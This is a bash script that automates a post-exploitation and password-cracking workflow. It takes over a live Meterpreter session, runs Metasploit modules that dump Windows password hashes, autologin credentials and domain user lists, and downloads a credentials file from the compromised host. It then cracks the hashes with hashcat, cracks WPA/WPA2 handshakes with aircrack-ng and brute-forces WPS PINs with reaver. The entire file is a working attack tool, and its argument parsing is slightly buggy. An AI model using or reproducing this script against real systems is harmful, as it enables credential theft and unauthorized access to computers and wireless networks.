#!/bin/bash
#instructs the script to exit if a command returns error
set -e
#creats a variable called LOGFILE that stores the name of a log file and includes the date and time
LOGFILE="automation_log_$(date +%F_%T).log"
#creates a new variable and reutrnes a Unix timestamp
OUTPUT_DIR="./output_$(date +%s)"
#Sets METERPRETER_RC variable to be a path inside the OUTPUT_DIR
METERPRETER_RC="$OUTPUT_DIR/meterpreter.rc"
#ouput directories
mkdir -p "$OUTPUT_DIR/metasploit" "$OUTPUT_DIR/hashcat" "$OUTPUT_DIR/aircrack-ng" "$OUTPUT_DIR/reaver"

#timestamped logging
log() {
    echo "[$(date +'%F %T')] $1" | tee -a "$LOGFILE"
}

#checks tool availability and installs if not 
check_tool() {
    if ! command -v "$1" >/dev/null 2>&1; then
        echo "[-] $1 is not installed."
        read -p "[?] Do you want to try installing $1? (y/n): " choice
        if [[ $choice == "y" ]]; then
            sudo apt update && sudo apt install -y "$1"
        else
            echo "[-] Aborting."
            exit 1
        fi
    fi
}

for tool in msfconsole hashcat aircrack-ng reaver; do
    check_tool "$tool"
done

#check if rockyou.txt exits, if not install...
if [[ ! -f /usr/share/wordlists/rockyou.txt ]]; then
    log "rockyou.txt not found, installing wordlists..."
    sudo apt update
    sudo apt install -y wordlists
    sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
    log "rockyou.txt installed and ready."
fi


#Argument parsing
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --session) SESSION="$2"; shift 2;;
        --hashfile) HASHFILE="$2"; shift 2;;
        --capfile) CAPFILE="$2"; shift 2;;
        --interface) INTERFACE="$2"; shift 2;;
        --wordlist) WORDLIST="$2"; shift 2;;
        --wps-bssid) WPS_BSSID="$2"; shift 2;;
        --hash-mode) HASH_MODE="$2"; shift 2;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

#Post-exploitation using Metasploit's Meterpeter
if [[ -z "$SESSION" ]]; then
    log "[*] No session ID provided. Attempting to auto-detect an active Meterpreter session..."

    SESSION_OUTPUT=$(mktemp)
    msfconsole -q -x "sessions -l; exit" > "$SESSION_OUTPUT"

    SESSION_ID=$(grep -P '^\d+\s+uuid.*Meterpreter' "$SESSION_OUTPUT" | awk '{print $1}' | head -n 1)

    if [[ -n "$SESSION_ID" ]]; then
        SESSION="$SESSION_ID"
        log "[+] Auto-detected Meterpreter session: $SESSION"
    else
        log "[-] No active Meterpreter sessions found."
        log "[?] Use 'msfconsole' and run 'sessions -l' to verify."
        exit 1
    fi
fi

# Validate the format
if ! [[ "$SESSION" =~ ^[0-9]+$ ]]; then
    log "[-] Invalid session ID format: $SESSION"
    usage
fi


# Build Meterpreter command script
log "Starting post-exploitation with Meterpreter session $SESSION..."

cat > "$METERPRETER_RC" <<EOF
sessions -i $SESSION
sysinfo
getuid
ps
run post/windows/gather/hashdump
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_domain_group_users
run post/windows/gather/enum_application
download /root/Desktop/credentials.txt $OUTPUT_DIR/metasploit/
exit
EOF

#Run the Meterpreter script
msfconsole -q -r "$METERPRETER_RC" | tee "$OUTPUT_DIR/metasploit/session_output.txt"

# Extract hashes
HASHES_EXTRACTED="$OUTPUT_DIR/metasploit/hashes.txt"
grep -oE '[a-fA-F0-9]{32}:[^:]*:[^:]*:[^:]*:[^:]+' "$OUTPUT_DIR/metasploit/session_output.txt" > "$HASHES_EXTRACTED" || true


#Offline Hash cracking using Hashcat
if [[ -f "$HASHES_EXTRACTED" || -n "$HASHFILE" ]]; then
    log "Starting offline cracking with Hashcat..."
    HASH_INPUT="${HASHFILE:-$HASHES_EXTRACTED}"
    HASH_MODE="${HASH_MODE:-0}"

    hashcat -m "$HASH_MODE" -a 0 "$HASH_INPUT" "${WORDLIST:-/usr/share/wordlists/rockyou.txt}" -o "$OUTPUT_DIR/hashcat/cracked.txt" --force | tee "$OUTPUT_DIR/hashcat/hashcat.log"
else
    log "No hashes found or provided for cracking."
fi

#WPA/WPA2 cracking using AIRCRACK-NG
if [[ -n "$CAPFILE" ]]; then
    if [[ -f "$CAPFILE" ]]; then
        log "Cracking WPA/WPA2 handshake with Aircrack-ng..."
        aircrack-ng "$CAPFILE" -w "${WORDLIST:-/usr/share/wordlists/rockyou.txt}" | tee "$OUTPUT_DIR/aircrack-ng/aircrack.log"
    else
        log "Provided .cap file '$CAPFILE' does not exist. Skipping Aircrack-ng."
    fi
else
    log "No .cap file provided for Aircrack-ng."
fi

# WPS brute-forcing using Reaver
if [[ -n "$INTERFACE" && -n "$WPS_BSSID" ]]; then
    log "Starting Reaver on interface $INTERFACE against BSSID $WPS_BSSID..."
    reaver -i "$INTERFACE" -b "$WPS_BSSID" -vv | tee "$OUTPUT_DIR/reaver/reaver.log"
else
    log "Missing interface or BSSID for Reaver."
fi

log "Post-exploitation automation completed. Output stored in: $OUTPUT_DIR"

